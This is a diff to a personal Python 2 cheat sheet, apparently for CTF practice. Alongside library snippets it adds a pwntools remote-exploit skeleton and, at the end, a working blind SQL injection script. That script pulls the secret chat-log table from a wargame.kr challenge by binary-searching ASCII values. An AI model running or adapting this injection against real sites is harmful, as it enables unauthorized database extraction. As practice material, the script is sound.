@@ -52,6 +52,16 @@ files = {
 }
 r = requests.get(url,files=files)
 
+
+# @return
+r.status_code
+# @timeout
+r = requests.get(url, timeout=1)
+
+# [urllib]
+# @quote
+urllib.unquote()#urldecode
+urllib.quote()#urlencode
 # [string]
 import string
 print string.ascii_letters #  include all kind of letter
@@ -60,6 +70,7 @@ print string.ascii_uppercase
 print string.digits
 
 # [random]
+import random
 print random.uniform(10, 20)#18.7356606526  
 print random.randint(12, 20)# 12 <= n <= 20
 print random.randrange(10, 100, 2)# choose a number in [10,12,14...]
@@ -91,6 +102,42 @@ print binascii.a2b_hex(s),s.decode('hex')
 import hashlib
 hashlib.md5('hhh').hexdigest()
 
+# [time]
+import time
+time.sleep(1)# sleep 1 seconds
+
+# [re]
+
+# [open]
+f = open("data3.txt") 
+line = f.readline() 
+lines = f.readlines()#when file is small you can use it 
+# or 
+for line in open("foo.txt"):
+    print line
+
+# [base64]
+import base64
+base64.b64encode('es')
+base64.b64decode('es')
+
+# [pwn]
+from pwn import *
+sh = process('./level2')
+sh = remote('pwn2.jarvisoj.com', 9879)
+level2 = ELF('./level2')
+sh.recvuntil('\n')
+p32(0x804a024)
+p64(0x804a024)
+sh.send(payload)
+sh.interactive()
+# [BeautifulSoup]
+from bs4 import BeautifulSoup
+res = requests.get(url)
+soup = BeautifulSoup(res.content, 'html.parser', from_encoding='utf-8')
+soup.find_all(id='papelist')
+soup.find_all('div',attrs={'id':'article_list'})
+soup.find_all(attrs={'class':"link_title"})
 # 2.functions
 
 def rand_str()
@@ -169,3 +216,45 @@ while 1:
         print s
 
         break 
+
+
+# binding sqlinject
+
+# coding:utf-8
+import requests
+from math import ceil
+global string
+string = ''
+
+def charge(mid,i):#判断大小
+    url='http://wargame.kr:8080/web_chatting/chatview.php?t=1&ni=if(ascii(substr((select group_concat(readme) from chat_log_secret),{0},1))<={1},10000000000,23334)'.format(str(i),str(mid))
+    #
+    s=requests.get(url=url)
+    content=s.content
+    length=len(content)
+    #print length
+    if length > 10 :
+        return 0
+    else:
+        return 1
+
+def dichotomie(l,r,i):#利用二分法查找
+
+    mid = (l+r)/2
+    #print "l and r ,mid:",l,r,mid
+    if l == r:
+        global string
+        string += chr(r)
+        print string
+        return 0
+    if charge(mid,i):#<=
+        #print 0
+        dichotomie(l,mid,i)
+    else:
+        #print 1
+        dichotomie(int(ceil((l+r)*1.0/2)),r,i)
+
+
+for i in range(1,100):
+    dichotomie(32,127,i)
+print string
